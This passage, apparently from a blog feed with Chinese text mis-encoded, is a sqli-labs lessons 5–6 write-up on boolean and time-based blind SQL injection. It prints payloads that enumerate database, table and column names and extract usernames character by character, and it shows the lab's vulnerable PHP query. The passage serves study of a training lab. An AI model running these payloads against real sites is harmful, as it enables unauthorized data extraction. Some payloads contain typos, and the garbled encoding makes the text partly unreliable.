left(database(),2)&gt;â€™saâ€™â€“+ ,è‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½å­—æ¯å¤§äºaï¼Œåä¹‹åˆ™è¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½å­—æ¯ä¸ºaã€‚ç„¶åä½¿ç”¨äºŒåˆ†æ³•å°†aæ¢æˆmï¼Œç»§ç»­è§‚å¯Ÿè¿”å›ç»“æœï¼Œé‡å¤ä½¿ç”¨äºŒåˆ†æ³•ï¼Œç›´åˆ°å¯ä»¥ç¡®å®šå‡ºå­—æ¯ä¸ºæ­¢ã€‚"></a>çŒœæµ‹æ•°æ®åº“åç§°ç¬¬äºŒä½â€“è¾“å…¥è¯­å¥?id=1â€™and left(database(),2)&gt;â€™saâ€™â€“+ ,è‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½å­—æ¯å¤§äºaï¼Œåä¹‹åˆ™è¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½å­—æ¯ä¸ºaã€‚ç„¶åä½¿ç”¨äºŒåˆ†æ³•å°†aæ¢æˆmï¼Œç»§ç»­è§‚å¯Ÿè¿”å›ç»“æœï¼Œé‡å¤ä½¿ç”¨äºŒåˆ†æ³•ï¼Œç›´åˆ°å¯ä»¥ç¡®å®šå‡ºå­—æ¯ä¸ºæ­¢ã€‚</h6><h6 id="çŒœæµ‹åç»­å­—æ¯å€¼åŒä¸Šï¼Œé‡å¤ä½¿ç”¨è¯­å¥å³å¯è·å¾—æ•°æ®åº“åç§°â€œsecurityâ€ã€‚"><a href="#çŒœæµ‹åç»­å­—æ¯å€¼åŒä¸Šï¼Œé‡å¤ä½¿ç”¨è¯­å¥å³å¯è·å¾—æ•°æ®åº“åç§°â€œsecurityâ€ã€‚" class="headerlink" title="çŒœæµ‹åç»­å­—æ¯å€¼åŒä¸Šï¼Œé‡å¤ä½¿ç”¨è¯­å¥å³å¯è·å¾—æ•°æ®åº“åç§°â€œsecurityâ€ã€‚"></a>çŒœæµ‹åç»­å­—æ¯å€¼åŒä¸Šï¼Œé‡å¤ä½¿ç”¨è¯­å¥å³å¯è·å¾—æ•°æ®åº“åç§°â€œsecurityâ€ã€‚</h6><h4 id="ä¸‰-çˆ†è¡¨"><a href="#ä¸‰-çˆ†è¡¨" class="headerlink" title="ä¸‰.çˆ†è¡¨"></a>ä¸‰.çˆ†è¡¨</h4><h5 id="ï¼é¦–å…ˆè¦å…ˆäº†è§£ä¸€ä¸‹asciiç è¡¨ï¼Œç”¨äºæ„å»ºæ³¨å…¥è¯­å¥ã€‚"><a href="#ï¼é¦–å…ˆè¦å…ˆäº†è§£ä¸€ä¸‹asciiç è¡¨ï¼Œç”¨äºæ„å»ºæ³¨å…¥è¯­å¥ã€‚" class="headerlink" title="ï¼é¦–å…ˆè¦å…ˆäº†è§£ä¸€ä¸‹asciiç è¡¨ï¼Œç”¨äºæ„å»ºæ³¨å…¥è¯­å¥ã€‚"></a>ï¼é¦–å…ˆè¦å…ˆäº†è§£ä¸€ä¸‹asciiç è¡¨ï¼Œç”¨äºæ„å»ºæ³¨å…¥è¯­å¥ã€‚</h5><h6 id="a-çˆ†ç¬¬ä¸€ä¸ªè¡¨ï¼šè¾“å…¥è¯­å¥-id-1â€˜and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1ï¼‰-1ï¼Œ1-gt-65-â€“-ã€‚"><a href="#a-çˆ†ç¬¬ä¸€ä¸ªè¡¨ï¼šè¾“å…¥è¯­å¥-id-1â€˜and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1ï¼‰-1ï¼Œ1-gt-65-â€“-ã€‚" class="headerlink" title="a.çˆ†ç¬¬ä¸€ä¸ªè¡¨ï¼šè¾“å…¥è¯­å¥?id=1â€˜and ascii(substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1ï¼‰,1ï¼Œ1)) &gt;65 â€“+ ã€‚"></a>a.çˆ†ç¬¬ä¸€ä¸ªè¡¨ï¼šè¾“å…¥è¯­å¥?id=1â€˜and ascii(substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1ï¼‰,1ï¼Œ1)) &gt;65 â€“+ ã€‚</h6><h6 id="æ³¨ï¼š"><a href="#æ³¨ï¼š" class="headerlink" title="æ³¨ï¼š"></a>æ³¨ï¼š</h6><h6 id="1-limit-0-1çš„æ„æ€æ˜¯ä»ç¬¬1è¡Œå¼€å§‹ï¼Œè·å–è¿™ä¸€è¡Œçš„è¿”å›å€¼ã€‚è€Œæ­¤å¤„çš„æ„æ€æ˜¯è·å–æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1ï¼‰-å³è·å–æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚å…¶åœ¨substrï¼ˆaï¼Œbï¼Œcï¼‰ä¸­å……å½“açš„å€¼ã€‚"><a href="#1-limit-0-1çš„æ„æ€æ˜¯ä»ç¬¬1è¡Œå¼€å§‹ï¼Œè·å–è¿™ä¸€è¡Œçš„è¿”å›å€¼ã€‚è€Œæ­¤å¤„çš„æ„æ€æ˜¯è·å–æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1ï¼‰-å³è·å–æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚å…¶åœ¨substrï¼ˆaï¼Œbï¼Œcï¼‰ä¸­å……å½“açš„å€¼ã€‚" class="headerlink" title="1.limit 0,1çš„æ„æ€æ˜¯ä»ç¬¬1è¡Œå¼€å§‹ï¼Œè·å–è¿™ä¸€è¡Œçš„è¿”å›å€¼ã€‚è€Œæ­¤å¤„çš„æ„æ€æ˜¯è·å–æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚{substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1ï¼‰}å³è·å–æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚å…¶åœ¨substrï¼ˆaï¼Œbï¼Œcï¼‰ä¸­å……å½“açš„å€¼ã€‚"></a>1.limit 0,1çš„æ„æ€æ˜¯ä»ç¬¬1è¡Œå¼€å§‹ï¼Œè·å–è¿™ä¸€è¡Œçš„è¿”å›å€¼ã€‚è€Œæ­¤å¤„çš„æ„æ€æ˜¯è·å–æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚{substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1ï¼‰}å³è·å–æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚å…¶åœ¨substrï¼ˆaï¼Œbï¼Œcï¼‰ä¸­å……å½“açš„å€¼ã€‚</h6><h6 id="2-æ•´ä¸ªè¾“å…¥è¯­å¥çš„æ„å›¾æ˜¯ï¼šé€šè¿‡asciiç è½¬æ¢ï¼ŒçŒœæµ‹æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨è¡¨åçš„é¦–å­—æ¯ã€‚ä¸ºäº†çŒœæµ‹å¾—åˆ°è¡¨åç¬¬äºŒä½å­—æ¯ï¼Œä»…éœ€å°†substrï¼ˆa-b-c-ä¸­çš„1æ”¹ä¸º2ã€‚åç»­å­—æ¯ä»¥æ­¤ç±»æ¨ï¼Œå¯å¾—æ•°æ®åº“ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚"><a href="#2-æ•´ä¸ªè¾“å…¥è¯­å¥çš„æ„å›¾æ˜¯ï¼šé€šè¿‡asciiç è½¬æ¢ï¼ŒçŒœæµ‹æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨è¡¨åçš„é¦–å­—æ¯ã€‚ä¸ºäº†çŒœæµ‹å¾—åˆ°è¡¨åç¬¬äºŒä½å­—æ¯ï¼Œä»…éœ€å°†substrï¼ˆa-b-c-ä¸­çš„1æ”¹ä¸º2ã€‚åç»­å­—æ¯ä»¥æ­¤ç±»æ¨ï¼Œå¯å¾—æ•°æ®åº“ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚" class="headerlink" title="2.æ•´ä¸ªè¾“å…¥è¯­å¥çš„æ„å›¾æ˜¯ï¼šé€šè¿‡asciiç è½¬æ¢ï¼ŒçŒœæµ‹æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨è¡¨åçš„é¦–å­—æ¯ã€‚ä¸ºäº†çŒœæµ‹å¾—åˆ°è¡¨åç¬¬äºŒä½å­—æ¯ï¼Œä»…éœ€å°†substrï¼ˆa,b,c)ä¸­çš„1æ”¹ä¸º2ã€‚åç»­å­—æ¯ä»¥æ­¤ç±»æ¨ï¼Œå¯å¾—æ•°æ®åº“ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚"></a>2.æ•´ä¸ªè¾“å…¥è¯­å¥çš„æ„å›¾æ˜¯ï¼šé€šè¿‡asciiç è½¬æ¢ï¼ŒçŒœæµ‹æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨è¡¨åçš„é¦–å­—æ¯ã€‚ä¸ºäº†çŒœæµ‹å¾—åˆ°è¡¨åç¬¬äºŒä½å­—æ¯ï¼Œä»…éœ€å°†substrï¼ˆa,b,c)ä¸­çš„1æ”¹ä¸º2ã€‚åç»­å­—æ¯ä»¥æ­¤ç±»æ¨ï¼Œå¯å¾—æ•°æ®åº“ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚</h6><h6 id="3-çŒœæµ‹çš„è¿‡ç¨‹åŒæ ·é‡‡ç”¨äºŒåˆ†æ³•ã€‚"><a href="#3-çŒœæµ‹çš„è¿‡ç¨‹åŒæ ·é‡‡ç”¨äºŒåˆ†æ³•ã€‚" class="headerlink" title="3.çŒœæµ‹çš„è¿‡ç¨‹åŒæ ·é‡‡ç”¨äºŒåˆ†æ³•ã€‚"></a>3.çŒœæµ‹çš„è¿‡ç¨‹åŒæ ·é‡‡ç”¨äºŒåˆ†æ³•ã€‚</h6><h6 id="b-çˆ†ç¬¬äºŒä¸ªè¡¨ï¼šä»…éœ€æŠŠaä¸­è¾“å…¥è¯­å¥çš„limit-0-1æ”¹æˆlimit-1-1ã€‚å…¶ä½™ç…§éƒ¨å°±æ¬ã€‚"><a href="#b-çˆ†ç¬¬äºŒä¸ªè¡¨ï¼šä»…éœ€æŠŠaä¸­è¾“å…¥è¯­å¥çš„limit-0-1æ”¹æˆlimit-1-1ã€‚å…¶ä½™ç…§éƒ¨å°±æ¬ã€‚" class="headerlink" title="b.çˆ†ç¬¬äºŒä¸ªè¡¨ï¼šä»…éœ€æŠŠaä¸­è¾“å…¥è¯­å¥çš„limit 0,1æ”¹æˆlimit 1,1ã€‚å…¶ä½™ç…§éƒ¨å°±æ¬ã€‚"></a>b.çˆ†ç¬¬äºŒä¸ªè¡¨ï¼šä»…éœ€æŠŠaä¸­è¾“å…¥è¯­å¥çš„limit 0,1æ”¹æˆlimit 1,1ã€‚å…¶ä½™ç…§éƒ¨å°±æ¬ã€‚</h6><h4 id="å››-çˆ†åˆ—"><a href="#å››-çˆ†åˆ—" class="headerlink" title="å››.çˆ†åˆ—"></a>å››.çˆ†åˆ—</h4><h6 id="å¦‚çŒœæµ‹usersè¡¨ä¸­æ˜¯å¦å­˜åœ¨usernameåˆ—ï¼Œè¾“å…¥è¯­å¥ï¼š-id-1â€™-and-1-select-1-from-information-schema-columns-where-table-name-â€™usersâ€™-and-column-name-regexp-â€˜-usernameâ€™-limit-0-1-â€“-è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜usersè¡¨ä¸­å­˜åœ¨usernameåˆ—ã€‚"><a href="#å¦‚çŒœæµ‹usersè¡¨ä¸­æ˜¯å¦å­˜åœ¨usernameåˆ—ï¼Œè¾“å…¥è¯­å¥ï¼š-id-1â€™-and-1-select-1-from-information-schema-columns-where-table-name-â€™usersâ€™-and-column-name-regexp-â€˜-usernameâ€™-limit-0-1-â€“-è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜usersè¡¨ä¸­å­˜åœ¨usernameåˆ—ã€‚" class="headerlink" title="å¦‚çŒœæµ‹usersè¡¨ä¸­æ˜¯å¦å­˜åœ¨usernameåˆ—ï¼Œè¾“å…¥è¯­å¥ï¼š?id=1â€™ and 1=(select 1 from information_schema.columns where table_name=â€™usersâ€™ and column_name regexp â€˜^usernameâ€™ limit 0,1)â€“+è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜usersè¡¨ä¸­å­˜åœ¨usernameåˆ—ã€‚"></a>å¦‚çŒœæµ‹usersè¡¨ä¸­æ˜¯å¦å­˜åœ¨usernameåˆ—ï¼Œè¾“å…¥è¯­å¥ï¼š?id=1â€™ and 1=(select 1 from information_schema.columns where table_name=â€™usersâ€™ and column_name regexp â€˜^usernameâ€™ limit 0,1)â€“+è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜usersè¡¨ä¸­å­˜åœ¨usernameåˆ—ã€‚</h6><h6 id="è¯æ˜å…¶ä»–åˆ—æ˜¯å¦å­˜åœ¨ä¹Ÿå¯ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œä»…éœ€å˜æ¢åˆ—åã€‚"><a href="#è¯æ˜å…¶ä»–åˆ—æ˜¯å¦å­˜åœ¨ä¹Ÿå¯ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œä»…éœ€å˜æ¢åˆ—åã€‚" class="headerlink" title="è¯æ˜å…¶ä»–åˆ—æ˜¯å¦å­˜åœ¨ä¹Ÿå¯ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œä»…éœ€å˜æ¢åˆ—åã€‚"></a>è¯æ˜å…¶ä»–åˆ—æ˜¯å¦å­˜åœ¨ä¹Ÿå¯ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œä»…éœ€å˜æ¢åˆ—åã€‚</h6><h4 id="äº”-çˆ†å€¼"><a href="#äº”-çˆ†å€¼" class="headerlink" title="äº”.çˆ†å€¼"></a>äº”.çˆ†å€¼</h4><h6 id="å¦‚è¾“å…¥è¯­å¥-id-1â€™-and-ord-mid-select-ifunll-cast-username-as-char-0x20-form-security-users-order-by-id-limit-0-1-1-1-68â€“-ã€‚æ„æ€æ˜¯è·å–usernameåˆ—ä¸­ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å¯¹åº”asciiç çš„æ•°å€¼ä¸68æ¯”è¾ƒï¼Œä»¥ç¡®è®¤å…¶å€¼ã€‚å…¶ä½™æ“ä½œéƒ½æ˜¯æŒ‰éƒ¨å°±æ¬ä¸Šé¢ã€‚"><a href="#å¦‚è¾“å…¥è¯­å¥-id-1â€™-and-ord-mid-select-ifunll-cast-username-as-char-0x20-form-security-users-order-by-id-limit-0-1-1-1-68â€“-ã€‚æ„æ€æ˜¯è·å–usernameåˆ—ä¸­ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å¯¹åº”asciiç çš„æ•°å€¼ä¸68æ¯”è¾ƒï¼Œä»¥ç¡®è®¤å…¶å€¼ã€‚å…¶ä½™æ“ä½œéƒ½æ˜¯æŒ‰éƒ¨å°±æ¬ä¸Šé¢ã€‚" class="headerlink" title="å¦‚è¾“å…¥è¯­å¥?id=1â€™ and ord mid((select  ifunll(cast(username as char),0x20)form  security.users order by id limit 0,1),1,1))=68â€“+ ã€‚æ„æ€æ˜¯è·å–usernameåˆ—ä¸­ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å¯¹åº”asciiç çš„æ•°å€¼ä¸68æ¯”è¾ƒï¼Œä»¥ç¡®è®¤å…¶å€¼ã€‚å…¶ä½™æ“ä½œéƒ½æ˜¯æŒ‰éƒ¨å°±æ¬ä¸Šé¢ã€‚"></a>å¦‚è¾“å…¥è¯­å¥?id=1â€™ and ord mid((select  ifunll(cast(username as char),0x20)form  security.users order by id limit 0,1),1,1))=68â€“+ ã€‚æ„æ€æ˜¯è·å–usernameåˆ—ä¸­ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å¯¹åº”asciiç çš„æ•°å€¼ä¸68æ¯”è¾ƒï¼Œä»¥ç¡®è®¤å…¶å€¼ã€‚å…¶ä½™æ“ä½œéƒ½æ˜¯æŒ‰éƒ¨å°±æ¬ä¸Šé¢ã€‚</h6><h2 id="B-sqlæŠ¥é”™æ³¨å…¥"><a href="#B-sqlæŠ¥é”™æ³¨å…¥" class="headerlink" title="B.*sqlæŠ¥é”™æ³¨å…¥"></a>B.*sqlæŠ¥é”™æ³¨å…¥</h2><h2 id="C-sqlå»¶æ—¶æ³¨å…¥"><a href="#C-sqlå»¶æ—¶æ³¨å…¥" class="headerlink" title="C.*sqlå»¶æ—¶æ³¨å…¥"></a>C.*sqlå»¶æ—¶æ³¨å…¥</h2><h6 id="é¢„å¤‡ï¼šæ—¶é—´ç›²æ³¨å¤šä¸ifï¼ˆexpr1-expr2-expr3ï¼‰ç»“åˆä½¿ç”¨ï¼Œæ­¤ifè¯­å¥çš„ç”¨æ³•æ˜¯ï¼šå¦‚æœexpr1æ˜¯trueï¼Œåˆ™ifï¼ˆï¼‰çš„è¿”å›å€¼ä¸ºexpr2ï¼›å¦åˆ™è¿”å›expr3"><a href="#é¢„å¤‡ï¼šæ—¶é—´ç›²æ³¨å¤šä¸ifï¼ˆexpr1-expr2-expr3ï¼‰ç»“åˆä½¿ç”¨ï¼Œæ­¤ifè¯­å¥çš„ç”¨æ³•æ˜¯ï¼šå¦‚æœexpr1æ˜¯trueï¼Œåˆ™ifï¼ˆï¼‰çš„è¿”å›å€¼ä¸ºexpr2ï¼›å¦åˆ™è¿”å›expr3" class="headerlink" title="é¢„å¤‡ï¼šæ—¶é—´ç›²æ³¨å¤šä¸ifï¼ˆexpr1,expr2,expr3ï¼‰ç»“åˆä½¿ç”¨ï¼Œæ­¤ifè¯­å¥çš„ç”¨æ³•æ˜¯ï¼šå¦‚æœexpr1æ˜¯trueï¼Œåˆ™ifï¼ˆï¼‰çš„è¿”å›å€¼ä¸ºexpr2ï¼›å¦åˆ™è¿”å›expr3."></a><em>é¢„å¤‡ï¼š</em>æ—¶é—´ç›²æ³¨å¤šä¸ifï¼ˆexpr1,expr2,expr3ï¼‰ç»“åˆä½¿ç”¨ï¼Œæ­¤ifè¯­å¥çš„ç”¨æ³•æ˜¯ï¼šå¦‚æœexpr1æ˜¯trueï¼Œåˆ™ifï¼ˆï¼‰çš„è¿”å›å€¼ä¸ºexpr2ï¼›å¦åˆ™è¿”å›expr3.</h6><p>å…³äºsleepå‡½æ•°ï¼š<a href="https://blog.csdn.net/zyz511919766/article/details/42241211">https://blog.csdn.net/zyz511919766/article/details/42241211</a></p><h6 id="1-åˆ©ç”¨sleepï¼ˆï¼‰å‡½æ•°è¿›è¡Œæ³¨å…¥ï¼š-id-1â€™and-If-ascii-substr-database-1-1-115-1-sleep-5-â€“-å½“é”™è¯¯çš„æ—¶å€™ç½‘é¡µä¼šæœ‰äº”ç§’çš„å»¶è¿Ÿã€‚"><a href="#1-åˆ©ç”¨sleepï¼ˆï¼‰å‡½æ•°è¿›è¡Œæ³¨å…¥ï¼š-id-1â€™and-If-ascii-substr-database-1-1-115-1-sleep-5-â€“-å½“é”™è¯¯çš„æ—¶å€™ç½‘é¡µä¼šæœ‰äº”ç§’çš„å»¶è¿Ÿã€‚" class="headerlink" title="1.åˆ©ç”¨sleepï¼ˆï¼‰å‡½æ•°è¿›è¡Œæ³¨å…¥ï¼š?id=1â€™and If(ascii(substr(database(),1,1))=115,1,sleep(5))â€“+å½“é”™è¯¯çš„æ—¶å€™ç½‘é¡µä¼šæœ‰äº”ç§’çš„å»¶è¿Ÿã€‚"></a>1.åˆ©ç”¨sleepï¼ˆï¼‰å‡½æ•°è¿›è¡Œæ³¨å…¥ï¼š?id=1â€™and If(ascii(substr(database(),1,1))=115,1,sleep(5))â€“+å½“é”™è¯¯çš„æ—¶å€™ç½‘é¡µä¼šæœ‰äº”ç§’çš„å»¶è¿Ÿã€‚</h6><h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><h6 id="åœ¨æœ¬é¢˜å­¦ä¹ æ—¶å­¦ä¹ äº†sqlç›²æ³¨ä¹‹æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»æ³•è·å¾—è¡¨åæˆ–åˆ—åã€‚"><a href="#åœ¨æœ¬é¢˜å­¦ä¹ æ—¶å­¦ä¹ äº†sqlç›²æ³¨ä¹‹æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»æ³•è·å¾—è¡¨åæˆ–åˆ—åã€‚" class="headerlink" title="åœ¨æœ¬é¢˜å­¦ä¹ æ—¶å­¦ä¹ äº†sqlç›²æ³¨ä¹‹æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»æ³•è·å¾—è¡¨åæˆ–åˆ—åã€‚"></a>åœ¨æœ¬é¢˜å­¦ä¹ æ—¶å­¦ä¹ äº†sqlç›²æ³¨ä¹‹æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»æ³•è·å¾—è¡¨åæˆ–åˆ—åã€‚</h6><h6 id="1-å¦‚åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-zä¸­çš„å­—ç¬¦ï¼Œè¾“å…¥è¯­å¥ï¼š-id-1â€™-and-1-select-1-from-information-schema-tables-where-table-name-â€™securityâ€™-and-table-name-regexp-â€˜-a-z-â€™-limit-0-1-â€“"><a href="#1-å¦‚åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-zä¸­çš„å­—ç¬¦ï¼Œè¾“å…¥è¯­å¥ï¼š-id-1â€™-and-1-select-1-from-information-schema-tables-where-table-name-â€™securityâ€™-and-table-name-regexp-â€˜-a-z-â€™-limit-0-1-â€“" class="headerlink" title="1.å¦‚åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-zä¸­çš„å­—ç¬¦ï¼Œè¾“å…¥è¯­å¥ï¼š?id=1â€™ and 1=(select 1 from information_schema.tables where table_name=â€™securityâ€™ and table_name regexp â€˜^[a-z]â€™ limit 0,1)â€“+"></a>1.å¦‚åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-zä¸­çš„å­—ç¬¦ï¼Œè¾“å…¥è¯­å¥ï¼š?id=1â€™ and 1=(select 1 from information_schema.tables where table_name=â€™securityâ€™ and table_name regexp â€˜^[a-z]â€™ limit 0,1)â€“+</h6><h6 id="2-å¦‚åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-nä¸­çš„å­—ç¬¦ï¼Œè¾“å…¥è¯­å¥ï¼š-id-1â€™-and-1-select-1-from-information-schema-tables-where-table-name-â€™securityâ€™-and-table-name-regexp-â€˜-a-n-â€™-limit-0-1-â€“"><a href="#2-å¦‚åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-nä¸­çš„å­—ç¬¦ï¼Œè¾“å…¥è¯­å¥ï¼š-id-1â€™-and-1-select-1-from-information-schema-tables-where-table-name-â€™securityâ€™-and-table-name-regexp-â€˜-a-n-â€™-limit-0-1-â€“" class="headerlink" title="2.å¦‚åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-nä¸­çš„å­—ç¬¦ï¼Œè¾“å…¥è¯­å¥ï¼š?id=1â€™ and 1=(select 1 from       information_schema.tables where table_name=â€™securityâ€™ and table_name regexp â€˜^[a-n]â€™ limit 0,1)â€“+"></a>2.å¦‚åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-nä¸­çš„å­—ç¬¦ï¼Œè¾“å…¥è¯­å¥ï¼š?id=1â€™ and 1=(select 1 from       information_schema.tables where table_name=â€™securityâ€™ and table_name regexp â€˜^[a-n]â€™ limit 0,1)â€“+</h6><h6 id="3-å¦‚ç¡®å®šä¸€ä¸ªæ•°æ˜¯nï¼š-id-1â€™-and-1-select-1-from-information-schema-tables-where-table-name-â€™securityâ€™-and-table-name-regexp-â€˜-nâ€™-limit-0-1-â€“"><a href="#3-å¦‚ç¡®å®šä¸€ä¸ªæ•°æ˜¯nï¼š-id-1â€™-and-1-select-1-from-information-schema-tables-where-table-name-â€™securityâ€™-and-table-name-regexp-â€˜-nâ€™-limit-0-1-â€“" class="headerlink" title="3.å¦‚ç¡®å®šä¸€ä¸ªæ•°æ˜¯nï¼š?id=1â€™ and 1=(select 1 from  information_schema.tables where table_name=â€™securityâ€™ and table_name regexp â€˜^nâ€™ limit 0,1)â€“+"></a>3.å¦‚ç¡®å®šä¸€ä¸ªæ•°æ˜¯nï¼š?id=1â€™ and 1=(select 1 from  information_schema.tables where table_name=â€™securityâ€™ and table_name regexp â€˜^nâ€™ limit 0,1)â€“+</h6><h6 id="4-è‡ªå·±åœ¨åç»­çš„åšé¢˜æ—¶å‘ç°å¸ƒå°”ç›²æ³¨æ³•ç”¨èµ·æ¥å¾ˆé¸¡è‚‹ï¼Œå› ä¸ºå¦‚æœé¡µé¢ä¸€ç›´å›æ˜¾ç»™ä½ you-are-iné‚£ä¹ˆä½ å°±æ— æ³•ç¡®å®šæ³¨å…¥è¯­å¥æ˜¯å¦æ­£ç¡®ã€‚"><a href="#4-è‡ªå·±åœ¨åç»­çš„åšé¢˜æ—¶å‘ç°å¸ƒå°”ç›²æ³¨æ³•ç”¨èµ·æ¥å¾ˆé¸¡è‚‹ï¼Œå› ä¸ºå¦‚æœé¡µé¢ä¸€ç›´å›æ˜¾ç»™ä½ you-are-iné‚£ä¹ˆä½ å°±æ— æ³•ç¡®å®šæ³¨å…¥è¯­å¥æ˜¯å¦æ­£ç¡®ã€‚" class="headerlink" title="4.è‡ªå·±åœ¨åç»­çš„åšé¢˜æ—¶å‘ç°å¸ƒå°”ç›²æ³¨æ³•ç”¨èµ·æ¥å¾ˆé¸¡è‚‹ï¼Œå› ä¸ºå¦‚æœé¡µé¢ä¸€ç›´å›æ˜¾ç»™ä½ you are iné‚£ä¹ˆä½ å°±æ— æ³•ç¡®å®šæ³¨å…¥è¯­å¥æ˜¯å¦æ­£ç¡®ã€‚"></a>4.è‡ªå·±åœ¨åç»­çš„åšé¢˜æ—¶å‘ç°å¸ƒå°”ç›²æ³¨æ³•ç”¨èµ·æ¥å¾ˆé¸¡è‚‹ï¼Œå› ä¸ºå¦‚æœé¡µé¢ä¸€ç›´å›æ˜¾ç»™ä½ you are iné‚£ä¹ˆä½ å°±æ— æ³•ç¡®å®šæ³¨å…¥è¯­å¥æ˜¯å¦æ­£ç¡®ã€‚</h6><h1 id="lesson6"><a href="#lesson6" class="headerlink" title="lesson6"></a>lesson6</h1><p>ç”±é¢˜ç›®å¯çŸ¥ï¼šè¿™æ˜¯åŒæ³¨å…¥åŒå¼•å·å‹ã€‚æˆ‘ä»¬é€šè¿‡æŸ¥æ‰¾æºä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>æ˜“çŸ¥æœ¬é¢˜çš„æ³¨å…¥ç‚¹ä»…éœ€æŠŠlesson5çš„æ³¨å…¥ç‚¹ â€˜ æ”¹ä¸º â€œ å³å¯ï¼Œå…¶ä½™æŒ‰éƒ¨å°±ç­ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lesson5&quot;&gt;&lt;a href=&quot;#lesson5&quot; class=&quot;headerlink&quot; title=&quot;lesson5&quot;&gt;&lt;/a&gt;lesson5&lt;/h1&gt;&lt;h2 id=&quot;A-sqlå¸ƒå°”ç›²æ³¨&quot;&gt;&lt;a href=&quot;#A-sqlå¸ƒå°”ç›²æ³¨&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson2ï¼Œlesson3ï¼Œlesson4</title>
    <link href="http://example.com/2020/11/16/blog%20d/"/>
    <id>http://example.com/2020/11/16/blog%20d/</id>
    <published>2020-11-16T14:04:05.000Z</published>
